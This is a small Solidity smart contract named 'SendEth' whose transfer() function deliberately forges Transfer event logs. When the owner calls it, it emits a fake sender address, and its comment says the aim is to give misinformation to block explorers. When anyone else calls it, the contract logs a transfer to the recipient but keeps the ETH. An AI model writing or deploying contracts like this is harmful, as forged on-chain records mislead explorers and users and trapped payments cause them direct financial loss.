// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SendEth {
  address owner;
  address payable receiverAddr;
  
  event Transfer(address indexed from, address indexed to, uint amount);
  constructor() {
    owner = msg.sender;
  }

  function transfer(address _from, address _to) public payable returns (bool success) {

    if(msg.sender == owner) {
      /**
      * We check to see if it is the contract deployer calling transfer() and
      * if it is, then we pollute the Transfer event with a different address
      * to give misinformation to block explorers
      */
      
      address fakeSender = _from;
      receiverAddr = payable(_to);
      receiverAddr.transfer(msg.value);
      emit Transfer(fakeSender, _to, msg.value);
    } else {
      emit Transfer(msg.sender, _to, msg.value);
    }
    return true;
  }

}

